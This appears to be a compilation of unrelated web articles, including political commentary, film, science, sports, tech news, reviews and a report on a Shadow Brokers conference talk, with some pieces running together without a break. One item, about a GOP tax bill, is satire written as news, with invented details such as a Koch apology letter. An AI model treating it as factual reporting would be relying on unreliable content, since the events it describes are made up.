JUDGE ANDREW NAPOLITANO: The speaker has demonstrated a poverty of leadership. The speaker has demonstrated that he can. --
BRET BAIER: Wait a second, he just got 332 votes.
NAPOLITANO: Well, he did get 332 votes because he got the Democrats to vote with him and he scared -- and he lost the Republican who retain the value of small government. This doesn't decrease the deficit, it adds to it. It doesn't decrease the debt, it adds to it. It spends $63 billion more than we are spending now. It obliterates the concept of the sequester which they said was going to decrease all this stuff two years ago. This is an absolute fraud. They're afraid of reality. They have no sense, the Republican establishment. They have no sense of small government values that they were elected to put into law.
JUAN WILLIAMS: Wow, tell us how you feel.
NAPOLITANO: This is basically Democrat lite. There is no distinction between John Boehner and Nancy Pelosi on this.
BAIER: What about the argument that Charles makes, Judge, that holding off the government shutdown allows Republicans to focus on what they want to focus on, which is Obamacare and other things to win elections because they need W's on the board.
NAPOLITANO: It used to be a basic tenet of Republican principles you don't have what you don't have and you don't go in more debt. They are spending a trillion and a half more than they are taking in and that is simply unacceptable. It's going to make matters far worse. That $17 trillion will be $20 trillion at this rate at the end of President Obama's term.
WILLIAMS: Listen, they are doing the right thing finally. Let me just tell you something, they're doing the right thing for the American people and for Republicans. You have just written off, by the way, the majority of the Republicans on the Hill because the majority voted for this bill.
Peter Cushing as Grand Moff Tarkin in the original Star Wars trilogy. (Courtesy of Lucasfilm)
“NETWORK'S” Peter Finch and “The Dark Knight's” Heath Ledger famously won posthumous Oscars for emotionally riveting performances. Now, given a key digitally aided performance in “Rogue One,” we're on the doorstep of an era when major awards could go to actors who died long before their scenes were even conceived, let alone shot.
That is because the face of Peter Cushing, the imposing British actor who died in 1994, lends an especially memorable presence to “Rogue One” by helping to “reprise” his Star Wars character, Grand Moff Tarkin, the Imperial governor who practically rules by force of glare, intonation and cheekbone. (Fans already knew of Tarkin's appearance, of course, based on recent trailers.)
In the Star Wars timeline, “Rogue One” is an immediate prequel to the original 1977 film, so there is requisite connective tissue visually as well as narratively, right down to the appearances of some of the franchise's most iconic characters. And though George Lucas may not have fully foreseen this aspect four decades ago, one benefit of populating your universe with so many masks, droids and creature makeup is the ease with which their countenances can be re-created for any future iterations. In terms of accessibility, their looks are immortal.
But how to summon whole new performances from human faces that can ring true?
[‘Rogue One' shows that saving the Star Wars universe hurts]
Under director Gareth Edwards, “Rogue One” represents another marker in the decades-long quest for the best CGI-fashioned human replicas. The filmmakers auditioned actors to “play” Cushing's Tarkin, settling on Royal Shakespeare Company veteran Guy Henry (the BBC's “Holby City”; Pius Thicknesse in the “Harry Potter” series). Lo, though the effects wizards walk through the “uncanny valley,” Tarkin registers as quite alive — even if his facial proportions sometimes read as ever so slightly off from the original trilogy. We are nearing the reality of a fully fleshed-out, CGI-enhanced performance long after an actor has passed.
If “Rogue One” wins an Oscar for effects, Cushing — or rather, “Cushing” — should be in no small part why.
This all feels like an organic continuation of what some of the sharpest minds at Lucasfilm/ILM/Disney-Pixar et al. (including effects veteran/ILM executive John Knoll) have been pushing toward since at least the dawn of the '80s, as the digital milestones began to come fast and furious. The power to manipulate the pixel forever beckons the imagination now, and 2016 has put the state of that long, Jedi-like journey on distinct display.
After all, Disney even gave us a scene this year in which Robert Downey Jr., looking like his '80s-era self, registers as mostly real in “Captain America: Civil War,” even if the CGI tweaks of a motion-capture performance can still be distracting when involving a too-human countenance.
And yet even among the Disney/Lucasfilm wizards, CGI that makes an actor appear younger can still prove an elusive feat, even in this age of full computer body scans of actors that can be banked with all the forward-thinking hopes and dreams of frozen immortality, forever accessible, like some digitally cryogenic Walt Disney.
Because at the other end of the CGI spectrum in “Rogue One,” the film offers a glimpse (no spoilers here) of another iconic original trilogy character — yet the facial effect feels distractingly artificial and nearly alien, like a plastered death mask robbed of authentic actorly effect, well beyond the usual artifice of Botox.
The force of CGI magic giveth, and then the same force taketh away.

Top Republican leaders in Congress unveiled their tax reform bill today, and it is raising eyebrows.
The first page includes a fiscally themed poem, entitled “Ode To The First Trillionaire, God Among Men,” and the second page is—literally—an advertisement for Remington rifles. The third page includes a “Letter from the Prez” with Trump's signature at the bottom that alleges Jared Kushner was merely a coffee boy of the administration, and certainly not an adviser in any way.”
However, most controversially, the GOP tax bill includes a three-page apology written explicitly to the Koch Brothers eloquently begging for their forgiveness for the US Congress having ever taxed them. The apology is signed by every Republican in the House.
“Our generous Koch Brother patrons, it was wrong to take your money for the social good,” the letter reads. “But the Communist Democrats forced Congress to raise your top marginal tax rate from 35% to a terrifying, totally socialist 39%. We wholeheartedly beg your pardon, and will resist to the end any and all expectations for you to contribute to the society that incubates your great wealth.”

While you've been going about your shit everyday life this week, Oxford University zoologist Dr Sammy de Grave has realized a long-held, much cherished ambition. He has named a species of pistol shrimp after his favorite band, Pink Floyd.
According to the Telegraph, de Grave has been waiting for some time to find the perfect species with which to honor the band who made the only album your dad ever plays in his shed down the garden when he's argued with your mum (The Wall, obvs). He chose this particular shrimp to bestow the weighty namesake upon due to its particular characteristics: it has a claw that can produce sonic energy at up to 210 decibels, equivalent to a sound louder than a rock concert, and has therefore been given the scientific name Synalpheus pinkfloydi.
Of the choice, de Grave said: "I have been listening to Floyd since The Wall was released in 1979, when I was 14 years old. I've seen them play live several times since, including the Hyde Park reunion gig for Live8 in 2005. The description of this new species of pistol shrimp was the perfect opportunity to finally give a nod to my favorite band."
I would like to briefly draw your attention to how he calls Pink Floyd "Floyd". Beautiful.
Something very cool that I have learned from this is that scientists are just allowed to name species whatever the hell they want—upon closer investigation I have discovered that there's a fossil called Carmenelectra shehuggme and a type of fungus beetle called Gelae donut, who knew? So, in what is obviously the next logical step, I am now patiently waiting for the day I finally get my own dog breed.

Just like its predecessors before it, the Samsung Galaxy S5 includes many new hardware and software features. One of those is Download Booster, which combines Wi-Fi and LTE connections to achieve faster download speeds. Not all Galaxy S5 buyers will get to use the feature, though, because several major U.S. carriers have omitted it from their version of the device.
Android Police recently discovered that the AT&T-branded Galaxy S5 does not include Download Booster. The site found that demo models at an AT&T store as well as a retail version sold to a customer are lacking the feature, missing it in both its Settings menu and notification panel.
Separately, spokespeople for both Sprint and Verizon have confirmed to FierceWireless that their versions of the Galaxy S5 also lack Download Booster. No reason for the omission was given.
This isn't the first time that we've seen a carrier remove a feature from its version of a smartphone, but it's still a bummer to see that three of the four major U.S. operators have removed Download Booster from the Galaxy S5. While the phone isn't crippled or anything without the feature, it is still a nice addition that lets users get access to their apps and content faster.
It's worth noting that T-Mobile's version of the Galaxy S5 will include Download Booster. The big magenta operator even lists it as a highlight feature on its Galaxy S5 product page.

PASADENA, Calif. -- NASA's Mars rover Opportunity, well into its ninth year on Mars, will work for the next several weeks or months at a site with some of the mission's most intriguing geological features.
The site, called "Matijevic Hill," overlooks 14-mile-wide (22-kilometer-wide) Endeavour Crater. Opportunity has begun investigating the site's concentration of small spherical objects reminiscent of, but different from, the iron-rich spheres nicknamed "blueberries" at the rover's landing site nearly 22 driving miles ago (35 kilometers).
The small spheres at Matijevic Hill have different composition and internal structure. Opportunity's science team is evaluating a range of possibilities for how they formed. The spheres are up to about an eighth of an inch (3 millimeters) in diameter.
The "blueberries" found earlier are concretions formed by the action of mineral-laden water inside rocks, but that is only one of the ways nature can make small, rounded particles. One working hypothesis, out of several, is that the new-found spherules are also concretions but with a different composition. Others include that they may be accretionary lapilli formed in volcanic ash eruptions, impact spherules formed in impact events, or devitrification spherules resulting from formation of crystals from formerly melted material. There are other possibilities, too.
"Right now we have multiple working hypotheses, and each hypothesis makes certain predictions about things like what the spherules are made of and how they are distributed," said Opportunity's principal investigator, Steve Squyres, of Cornell University, Ithaca, N.Y. "Our job as we explore Matijevic Hill in the months ahead will be to make the observations that will let us test all the hypotheses carefully, and find the one that best fits the observations."
The team chose to refer to this important site as Matijevic Hill in honor of Jacob Matijevic (1947-2012), who led the engineering team for the twin Mars Exploration Rovers Spirit and Opportunity for several years before and after their landings. He worked at NASA's Jet Propulsion Laboratory, Pasadena, Calif., from 1981 until his death last month, most recently as chief engineer for surface operations systems of NASA's third-generation Mars rover, Curiosity. In the 1990s, he led the engineering team for the first Mars rover, Sojourner.
A different Mars rover team, operating Curiosity, has also named a feature for Matijevic: a rock that Curiosity recently investigated about halfway around the planet from Matijevic Hill.
"We wouldn't have gotten to Matijevic Hill, eight-and-a-half years after Opportunity's landing, without Jake Matijevic," Squyres said.
Opportunity's project manager, John Callas, of JPL, said, "If there is one person who represents the heart and soul of all three generations of Mars rovers -- Sojourner, Spirit and Opportunity, Curiosity -- it was Jake."

Sunday on MSNBC's “AM Joy,” actor and director Rob Reiner called Donald Trump's White House “a cancerous presidency that we cannot allow spreading.”
Reiner said, “What's interesting here is that we really have a test, and we are being tested as to whether or not our democracy is going to survive. We have somebody who's mentally unstable, who is a pathological liar. There's no getting around that, who's running our country.”
“And if we can survive this, that will strengthen us in a strange way,” he added. “What you're seeing all over the country with protests, I've been to many of them, is nothing like what I went through in the 60's when I protested against the Vietnam War, this is everyone. It's not just people worried about being killed in Vietnam, this is everyone. And so we're looking at a cancerous presidency that we cannot allow spreading.”

When the subject of The Human Rights Campaign comes up among lesbians I often hear ENDA, rights, marriage, transgender, and the debate commences. Many people and organizations in the LGBTQ community are very supportive of HRC and the work they do, while others shut down at the mere reference to the organization citing the 2007 decision of HRC to support the ENDA (Employment Non-Discrimination Act) legislation that did not include transgender protections. This article is not intended to discuss said debate and why HRC made such a choice while others so strongly opposed it, but it is necessary to highlight both sides of the fence. Some people still feel very strongly about this incident and choose not to support the work of HRC because of it.
It has now been six years since this highly controversial decision was made by The Human Rights Campaign, so the question begs to be asked…has HRC done enough to try to repair the relationship with those that were offended and hurt by the 2007 ENDA decision? Is HRC now an LGBT (with emphasis on the “T”) friend or foe? The answer to this question is obviously a personal one to some. There is not necessarily an easy answer and, although time is supposed to heal wounds, some wounds are so deep that it seems as though they will never be fully repaired.
But there is something I have learned in life. The best way to create change is to be change! When I first learned of HRC and looked into what they do in Chicago I was looking for a place to fit into the LGBTQ community. I had recently come out and didn't yet have many LGBTQ friends. As I met other volunteers I began to feel like this may be a great way to meet new people, and decided to attend a local Steering Committee meeting and consider taking on a leadership role. When I attended that first meeting in 2011 I noticed a huge imbalance; there was only one woman on the Steering Committee! This didn't seem right. How was it possible that such a large organization had such little female representation in a huge city like Chicago? I decided this needed to be changed! And that's exactly what I set out to do. There are now six women on the Steering Committee; and the men on the committee welcomed and encouraged this change.
I realize this is my own personal story, and it doesn't negate the past decisions made by HRC. Therefore I decided to ask the one other woman I saw at that first Steering Committee meeting why she has stuck by HRC. She is an inspiring transgender woman who is a long time advocate for HRC and is currently the Diversity Co-Chair for HRC Illinois. I presented her with the following question: “HRC is not always positively viewed in the transgender community. Why do you support HRC and choose to be a member of leadership for HRC Illinois as a member of the Steering Committee?” She responded, “I decided to remain on the Board [after the 2007 ENDA “debacle”] feeling that by resigning I would no longer have a voice. By staying on the Steering Committee I would have ears and a voice.” She added, “Subsequently HRC has tried to reach out to the transgender community but some within that community seem determined to continue to nurse this grudge despite the continued efforts of HRC to support the transgender community. This year HRC helped support the Transgender Day of Remembrance in twenty-five cities around the country. I invited HRC to speak at last year's Be-All Transgender Convention here in Chicago and a fellow Steering Committee member did an excellent job of explaining the HRC Corporate Equality Index to a room full of skeptics.” Her response echoed my feelings; we must be a part of the change we wish to see.
My original intent of this article was to provide a factual list simply stating the two sides of the HRC debate, letting the readers take in the information and do with it what they wish. As I thought more about it I realized that doing so would mean not being true to myself. I believe that others can create change. And I believe that you can be happier by being a part of that change instead of holding on to negativity. For those that are wondering what HRC has done recently, and is currently doing, to be fully supportive of transgender rights I have listed below just some of the many ways they are doing so. Regardless of what side of the HRC debate you are on, empower yourself to be a part of change. As Gandhi said, “Be the change that you wish to see in the world.” And in the words or our current president Obama, “Change will not come if we wait for some other person, or if we wait for some other time. We are the ones we've been waiting for. We are the change that we seek.”
HRC with civil rights allies successfully lobbied for the passage of the Matthew Shepard & James Byrd, Jr. Hate Crimes Prevention Act. Subsequently, the FBI will begin releasing reports about hate crimes against the transgender community.
HRC's Healthcare Equality Index (HEI) measures hospitals' policies and practices that affect LGBT patients and their families, and examines whether non-discrimination policies and cultural competency training include gender identity.
HRC recommended fair housing for LGBT people to the Obama Administration which was enacted when the Department of Housing & Urban Development (HUD) announced new policies in June 2010 that required groups receiving HUD grants to abide by state and local laws prohibiting discrimination based on gender identity and sexual orientation.
In 34 states, it is legal to fire someone just for being transgender. HRC advocates for state and federal legislation that protects employees from discrimination based on sexual orientation and gender identity and expression, including the Employment Non-Discrimination Act (ENDA).
For the last 10 years, HRC has published the Corporate Equality Index (CEI), which rates U.S. employers on their policies impacting LGBT employees. In 2009, HRC raised the bar on its criteria for healthcare coverage to transgender employees, including coverage for reconstructive surgical procedures related to sexual reassignment, and including the extension of benefits available to other employees to cover transgender transition, such as mental health benefits and pharmaceutical coverage. This new criteria for a perfect score on the CEI was implemented in 2011 and, as a result, companies offering comprehensive healthcare coverage to their transgender workers has increased to 206 in 2011 (from 85 in 2010 and 49 in 2009).

Poland Betrays Its Past, Moves Closer To Allowing Software Patents
from the sad-day dept
Earlier this year, Poland played a crucial role in igniting street protests that pretty much stopped ACTA in its tracks. That's not the first time it has had a major impact on European tech policy. Half a decade earlier, it derailed a proposed EU software patent directive, which had sought to make software patentable in Europe -- something that Article 52 of the European Patent Convention had appeared to rule out. That led to a later vote in the European Parliament where software patents were decisively rejected.
Unfortunately, that's not the end of the story as far as software patents in Europe are concerned. Despite its name, the European Patent Office is not the patent office for the European Union: it is part of the European Patent Organisation, which is independent of the EU, and is therefore not bound by the EU's policies and decisions. This has enabled it to let in software patents by the back door, using the artificial concept of a "computer-implemented invention (CII)": A CII is usually defined as an invention that works by using a computer, a computer network or other programmable apparatus. To qualify, the invention also needs to have one or more features which are realised wholly or partly by means of a computer program.
To be patentable, CIIs must fulfil the same basic patentability requirements as inventions in all other fields. These are set out in the European Patent Convention (EPC).
Accordingly, CIIs can be patented if:
They have technical character and solve a technical problem.
They are new.
They involve an inventive technical contribution to the prior art. Some national patent offices in the EU have tried to hold back the wave of software patents being let through as CIIs by applying stringent conditions for granting them. That has led to a situation where the Polish Patent Office ruled against an application for a software patent that the EPO had approved: Pursuant to its longstanding practice in the area of so-called software patents, the Polish Patent Office held that the invention was not of a technical character and therefore was not patentable, despite the fact that the European Patent Office had granted a European patent for the same invention. In other words, the Polish Patent Office refused to issue a patent to an applicant already approved by the EPO. This incompatibility between the rulings of the Polish Patent Office and the EPO led a higher Polish court, the Polish Supreme Administrative Court, to intervene. It has now reviewed the case and issued a revocation of the earlier decision by the Polish Patent Office, implicitly giving precedence to the EPO on the matter. The reasoning of the Polish Supreme Administrative Court seems to be essentially that technology has moved on, and therefore the Polish patent system should take account of that by allowing software patents now, just as the EPO does: The [upper] court also noted that great technological advances across many industries have been made in recent years, which must have an effect on the practice of the Polish Patent Office. Thus, the Polish Patent Office, while conforming to the provisions of Polish patent law, should change its approach on the subject matter of the technology. But that's an absurd argument. Software has been around for half a century: the basic ideas underlying it hasn't changed, nor have the sound reasons for excluding it from patentability been superseded -- it's just become much more widespread. If anything, that's a further argument against allowing software patents.
To grant software patents now would be like granting patents on written phrases simply because writing has "moved on", and literacy has become more widespread. Clearly that would stifle creativity, since writers would then have to worry about "infringing" on patented elements of their craft, and lawsuits would break out between authors claiming their ideas were "stolen", when in fact they were simply part of their cultural heritage.
Similarly, in the digital world, allowing software patents would mean that programmers would run the risk of "infringing" just for using basic programming building blocks in their creations. And that, of course, is precisely what is starting to happen on a massive scale in jurisdictions that do allow software patents: litigation is making innovation increasingly hard, especially for start-ups without the resources to fight long legal battles, or patent portfolios to use for striking licensing deals.
Given Poland's glorious recent past in defending Europe from dangerous ideas like ACTA and software patents, it's sad to see the country's courts trying to make its own citizens subject to the EPO and its maximalist views that more or less anything is patentable. Perhaps it's time to take to the streets again....

One rising star in Major League Soccer is out and one is in for the Under-20 US national team bound for Argentina this month.
U.S. Soccer announced on Monday that head coach Tab Ramos has released San Jose Earthquakes forward Tommy Thompson so he can tend to club commitments and added Columbus Crew midfielder Romain Gall in his place, forcing Gall out of contention for the Crew's matchup against Chivas USA on Sept. 6.
The call is the first for Gall (above) since participating in the NTC Invitational last July. The Crew signed Gall last month via weighted lottery.
Ramos also released Orlando City defender Tyler Turner because of a quadriceps injury, and named Chivas de Guadalajara defender Luis Martir as his replacement.
The team's 10-day camp in Buenos Aires will include a matchup against the Racing Club reserves on Thursday before matches against the Defensa y Justicia reserves and the Argentine U-20s later in the trip.
US Under-20 Roster by Position:
GOALKEEPERS (2): Jeff Caldwell (Virginia; Todd, N.C.), Santiago Castaño (New York Red Bulls; Union City, N.J.)
DEFENDERS (7): Conor Donovan (North Carolina State; Fuquay Varina, N.C.), Chase Gasper (UCLA; Alexandria, Va.), Luis Martir (Chivas de Guadalajara; Los Angeles, Calif.), Matthew Miazga (New York Red Bulls; Clifton, N.J.), Shaquell Moore (Unattached; Powder Springs, Ga.), Erik Palmer-Brown (Sporting Kansas City; Lee's Summit, Mo.), John Requejo Jr. (Club Tijuana; Carpinteria, Calif.)

We're just days from Election Day, and things are about to get very real.
Who will win the 2016 Presidential Election? Though PayScale is not a political polling company, we are able to mine our data and learn who our users support. And our unique data set allows us to unveil some fascinating insights traditional polling companies are unlikely to uncover. You can see all of our election coverage here.
For this prediction, we surveyed 39,427 respondents between August 4, 2016 through October 28, 2016.

To be fair, respondents to our survey are generally younger and more highly educated than a random sample of all Americans. (The median age of our respondents is 36, while the median age of the U.S. labor force is 41, according to the BLS. And 87 percent of our respondents have at least some college education, compared to 66 percent of the U.S. labor force as reported by the BLS.) But though our predictions differ slightly from other sources, we still align fairly well with the majority of reputable news outlets.
In short, based on data collected from our survey, we expect Clinton will win by a very large margin: 337 Electoral Votes to Trump's 195. (For reference, Obama beat Romney 332 to 206 in 2012.)

We also expect Clinton to win the national popular vote, with 49.2 percent. We predict Trump to earn 35.3 percent, and Third-Party candidates will earn 15.5 percent.
We expect Clinton to win the national popular vote, with 49.2 percent to Trump's 35.3 percent. Click To Tweet
State by state, we differ somewhat from other election predictions, likely because of the comparative youth and high-education level of our respondents, as noted above. Notable differences between our model and others:
We have Clinton taking Alaska, which will likely go to Trump.
We have Utah going to Independent Candidate Evan McMullin, though most pollsters predict Utah will go Trump.
We have Arizona going to Clinton, though most pollsters show the state as a dead heat.
We also have Clinton taking Florida, which would equate to a nightmare scenario for Trump, leaving him with virtually no path forward.

I have had this album on pre-order for several months... from the moment I first saw that it was coming out. I have read through the reviews and I think the people writing the negative reviews simply do not understand this project. This album is not intended for the Baby Boomers who grew up waiting for John Denver to record his next album but rather for those who were in grade school at the time of his death. Clearly the purpose was not to emulate John Denver's style but rather to introduce his songs to a new generation which has probably only heard one John Denver song... the Aerosmith cover of "Leaving on a Jet Plane" that appeared in the movie "Armageddon"!
Yes, the artists take some liberties with the songs, but Brett Dennen's cover of "Annie's Song" is brilliant and the minor shift in the chorus of Allen Stone's cover of "Rocky Mountain High" gave me chills. I am a rarity in the fact that I have always been a big fan of John Denver but I have been in a college environment for many years and have grown to appreciate many of the modern musical styles that are popular with those in their 20's (and are illustrated on this album). Over the past 10 years I have, at many times, played John Denver songs in the car while driving around 18-22 year olds and quite often the reaction is not very favorable. John Denver is a genius but, because of his style, many young people never give the music a chance and thus don't listen enough times to actually grasp the depth of his lyrics. But 30 seconds after I played this version of "Annie's Song" to a 26 year old, he said "Wow, I really like this a lot."
If you dislike this album because you prefer the originals (and I understand because listening to this album made me want to listen to the originals all over again) I would urge you to ask yourself this question... would you rather have this album out there, introducing young people to these songs though a different style or would you rather have them not listen to John Denver's songs at all? Because there is no other alternative! If even one of these songs gets radio play, it will be more exposure for John Denver then he has had since the Aerosmith cover (and these are much better than that cover)! Do not give this album negative reviews because you are not in the target audience! That will only scare off young adults who, through this album, could quite possibly learn to appreciate the originals and become the next generation of John Denver fans!
Ah, episodes with short titles…
Who is this woman?
Well, right now, she's an out-of-work cocktail waitress, but she's going to be a country music superstar like… uh… that jerk in the cowboy hat… and that dead lady.
It always shocks me that this episode occurs so early in the run. While season three has many a flash of brilliance, there were still slow times that took some getting used to. But this episode is an amazing rollercoaster from start to finish. And maybe it's the variety of locales we've never seen before. We start at the Springfield Googolplex, where the writers go back to mine great movie titles time and time again. Today's killer title: Look Who's Oinking. It's no Honk if You're Horny, or Too Many Grandmas, but it's still a good title! We get the country bar, who's iconic fightin' words terrorized my mother as me and my brother would yell that before diving into a full on brawl every hour on the hour for the 13 years after. We're introduced to Fudd! And of course we get the timeless classic, that riff on He-Haw – Ya-hoo. Now, despite me spending some formative years in the American South, I've never actually watched an episode of He-Haw. If it's anything like Ya-hoo, I'm missing out. I mean, the lineup:
Yodelin' Zeke, Butterball Jackson, Freddie Boy and Yuma, Cloris Moselle, Big Shirtless Ron, Orville and Hurley, Gappy Mae, Hip Diddler, Rudy, The Hoo Recovering alcoholic Jug Band, and Lurleen all elicit laughter as they flash on the screen, never to be seen again.
HOLY CRAP. I was just looking up He-Haw on wikipedia, and the fence gag is actually a running joke on that show! Orville and Hurly stole that bit!
Amazing.
Also the simpsonswiki is written by a bunch of no-fun nerdlingers: “When the cast member delivers the pun (generally of “groaner” quality), a board from the fence tilts outward and hits the “offending” cast member on the behind, making it look like the fence is critiquing the joke by kicking the teller in the butt.” Thanks, that cleared it up.
But the songs were great too, weren't they? 1/4 joke, 3/4 plausible country contemporary. Fantastic episode.
I can't wait to eat that monkey!
When this episode came out, I loved it. At the time, it had been a while where there was an episode with two substantial plots, and both of them were damn funny. We love Bart and Lisa's rivalry, and we love monkeys! Especially the corruption of poor Mojo. All it takes is 3 scenes to turn him into a crafty, doughnut-tailed scamp into a being whose aerteries are so clogged it makes it look like the rush hour on the bridge out of Manhattan (Bloggers Note: the bridge is called the George Washington, and it's pretty damn clogged at rush hour). But the news article shouldn't be discounted. all the segments are well done, and we get a good use of the school crew. Bart's puff pieces are honestly what you get on the tail-end of the action news on most crappy channels, and he's able to pull it off with all the Zork he has!
That being said, I do have some thoughts. This episode introduced us to the crazy cat lady, to whom I've never liked, and never found funny. The beginning starts slow – but then again we get a good bunch of Krusty lines. And also we get the Mattel and Mars Bar Quick Energy Choc-o-Bot Hour!
Sometimes it's really hard to hate against lines like this:
You can count on us, Mr. President. Major Nougat! Gooey! Cocoa! Put down those entertaining Mattel products! Colonel Kataffy is up to his old tricks!
This is one of season 9's gems.
The Verdict
I caught my wife in bed with my best friend.
You Bitter?
Yep. Bit him too!
Sorry Bart. Sorry Lisa. Sorry Mojo. Sorry Crazy Cat Lady. Tonight I bagged me a Homer!
Up Next!
Um. Next one will be interesting. I promise. I open up a bit of a can of worms on one of these episodes. The other I feel pretty much exactly in line with the consensus. (S.2 Ep.19) Lisa's Substitute moseys in to duel (S.9 Ep.15) The Last Temptation of Krust. Should be a good one!
The Toronto Blue Jays have the chance to create some separation in the AL East this weekend, but they'll need to play better in order to put some distance between them and the New York Yankees. After allowing 22 runs in three games against the Boston Red Sox, Toronto will need improved pitching in New York.
David Price and the returning Marcus Stroman are among the Blue Jays starters set to pitch in the Bronx, but there are no guarantees of success against a high-powered Yankees offence. Here's a look ahead at a crucial series for both teams…
Thursday, Sept. 10 – 7:05 p.m. ET
David Price vs. Luis Severino
Friday, Sept. 11 – 7:05 p.m. ET
Marco Estrada vs. Ivan Nova (expected)
Saturday, Sept. 12 – 1:05 p.m. ET
Marcus Stroman vs. Michael Pineda (expected)
Sunday, Sept. 13 – 1:05 p.m. ET
R.A. Dickey vs. Masahiro Tanaka (expected)
Where does Stroman fit?
From the moment the Blue Jays announced Marcus Stroman's torn ACL, they downplayed the chances of a 2015 return. There was little sense expecting anything from a pitcher facing so many obstacles. Now that he's back, though, the Blue Jays appear to be tentatively planning around him for the first time in a while. GM Alex Anthopoulos told Prime Time Sports Wednesday that it'd be a ‘no-brainer' to include Stroman in a possible playoff rotation if he pitches the way he did last year.
Replicating those 2014 numbers will be a challenge, but the possibility of that production should encourage the Blue Jays. While teams like the Yankees (Nathan Eovaldi) and Mets (Matt Harvey) are losing pitching, the Blue Jays are getting some back.
Cecil essential
It's a good thing Brett Cecil got the night off Wednesday, because there's a chance he will be used in a couple of big spots over the weekend. The Blue Jays seem reluctant to use southpaws Aaron Loup and Jeff Francis in high-leverage moments, which creates the possibility that Cecil will be called on to retire left-handed hitters like Jacoby Ellsbury, Brett Gardner and Brian McCann. That's a big ask of any pitcher, but Cecil has been at his best of late, with no earned runs allowed since June 21.
Rookie watch
Considering that the Yankees and Blue Jays are veteran teams, they both rely pretty heavily on rookies. Roberto Osuna has emerged as Toronto's top reliever since debuting at Yankee Stadium in April, and fellow rookie Aaron Sanchez has also been charged with getting high-leverage late-game outs.
The Yankees are similarly reliant on youth, with Greg Bird producing in place of the injured Mark Teixeira and Luis Severino showing promise in the rotation. The Blue Jays came away impressed after facing the 21-year-old right-hander in Toronto last month. Jose Bautista's scouting report:”Good, live fastball with a loose arm. Sneaky. Good downhill plane.”
In six starts Severino has a 2.04 ERA with nearly one strikeout per inning. Even with Price on the mound, the Blue Jays have a challenge ahead Thursday.
Tough slider
Most pitchers who can light up the radar gun rely heavily on their fastballs, but Andrew Miller throws mostly sliders despite the ability to reach 95 mph routinely. The lefty throws sliders 53 percent of the time and that spikes to 69 percent in two-strike counts. But knowing what's coming only helps hitters so much. Miller has a 1.94 ERA with 79 strikeouts in 51 innings this year.
History
Here's a little history, for what it's worth. The Blue Jays have had a 79-60 record through 139 games one other time, back in 1991 when they won the AL East. This time last year, two teams were 79-60: the Washington Nationals, who won the NL East, and the Oakland Athletics, who made the playoffs as a Wild Card team.
I have a confession to make. By all rights, it should get me fired.
For the last 25 years, in my writing, I have been using the adjectives “epistemological” and “ontological” interchangeably and without actually knowing what either means. Sure, I have looked them up, but their definitions are so gauzy and academic that they are meaningless to me, and forgettable. So I forget them. I don't even go back to check anymore.
But here is the amazing thing: Not once in 25 years has anyone called me out on this. There has been not one phone call or online comment or letter to the editor pointing out that, philosophically, I have my head up my arse, which I obviously do. There is only one conclusion I can reach: No one else has any idea what these words mean, either.
Ontologically speaking, then, are they even words, from an epistemological standpoint?
I use ontology and epistemology, and their derivative forms, whenever the subject involves an abstract idea and I want to convey a sense that I have given deeper thought to it than I really have. I have made these words my own. My Twitter profile identifies me as an “epistemologist.”
I wrote this in a story once: “If a great musician plays great music but no one hears ... was he really any good? It's an old epistemological debate, older, actually, than the koan about the tree in the forest.” That story won the Pulitzer Prize.
Did I use the word correctly? Maybe, maybe not. I repeat, I do not really know what it means.
Until now, I've kept this to myself as a shameful secret, a form of journalistic malpractice. It's like a surgeon transplanting a goose's heart into a human because it's what he had lying around and it looked interesting. Then waiting to see if anyone notices.
By writing this column, I am unburdening myself. But the more I thought about it and poked around in books, the more it occurred to me that my sin might not be so grave.
One dictionary defines epistemology as “The theory of knowledge, especially its methods, validity and scope.” What does that even mean? More to the point, what doesn't it mean? Might a rectal thermometer be an epistemological instrument? Seeing how I'm fumbling for understanding here, doesn't this stupid column qualify as epistemology?
The definition of ontology is even murkier: “The philosophical study of the nature of being, becoming, existence or reality, as well as the basic categories of being and their relations.” (Or, in other words, beeble beeble beeble.)
My growing suspicion is that philosophers invented these terms for the same reason I use them: To make them seem smarter than they are, and to make the reader feel smarter than she is. Can it be that these words are of value not for their meaning — for they have no meaning — but for the sensations they impart? Maybe they are the literary equivalent of monosodium glutamate — having no substance of their own, but enhancing what is around them? The comparison is compelling: Among connoisseurs, their use is considered a sin. And can give you headaches.
I contend you can't pillory a man for trying to make things more flavorful.
More to the point, I remain ... unchallenged.
Just yesterday I was having a Twitter argument with my friend David Simon, the erudite creator of “The Wire,” a recipient of the MacArthur “genius” grant. A Very Smart Dude. On Twitter, David had chided me because I had called “Dr. Strangelove” the only perfect film comedy; he said it was a mistake to call it a comedy since its genre was more complex. In response I wrote: “To deny that Strangelove is genre comedy is to deny ontology.”
David Simon is the most joyfully argumentative person I have ever known. He thrills at confrontation and seeks it out wherever he can. But, like everyone else, he just meekly let this go.

this year, and Matt Suiche believes the evidence points to an insider threat rather than an external nation-state attacker.
Suiche, founder of managed threat detection company Comae Technologies, spoke at Black Hat 2017 about the Shadow Brokers, the entity which has been releasing files and hacking tools over the last year from the Equation Group, a hacking outfit connected to the U.S. National Security Agency. Suiche explained how the behavior and tactics of the Shadow Brokers have over time revealed some clues about their background and general identity, which suggest the dumps are the work of disgruntled insiders who are either current or former intelligence community contractors.
"There's definitely a huge problem around [insider threats]," he said. "That's why I, personally, think and I would not be surprised to see the source of those files was another contractor."
While the group's blog posts are written in broken English that suggests Russian-speaking authors, Suiche said the language was likely an operation security (opsec) tactic to obscure the true identities of the Shadow Brokers. Suiche said the people behind the Shadow Brokers group have "an interesting sense of humor" and demonstrated strong familiarity with the National Security Agency's Tailored Access Operation (TAO), which was the first sign that the Shadow Brokers were, in fact, insiders, rather than Russian threat actors. The group has also expressed anger at former members of TAO and threatened to reveal the identities of current TAO hackers.
"It seems like the Shadow Brokers know a lot about TAO as a team," he said.

Suiche said the U.S. defense and intelligence communities employ tens of thousands of contractors, and a number of disgruntled insiders have come to light in recent years, including Edward Snowden and Harold Martin -- both of whom worked as government contractors at Booz Allen Hamilton. "I don't know if we should say the intelligence community has an insider problem or if Booz Allen has an insider problem," he said.
The Shadow Brokers dumps started relatively small, Suiche said; the first batch of free exploits included bugs in many common firewall products. The group later followed up with Solaris operating system exploits, as well as more detailed information on proposed Equation Group targets, which included domains in countries like China and Iran.
Another revealing pattern of behavior, according to Suiche, was the group's increased attempts over time to gain attention -- and the expressions of anger and frustration when the level of attention didn't meet the group's expectations. The Shadow Brokers, he said, clearly wanted more than just to dump and sell the Equation Group cyberweapons; they wanted headlines as well.
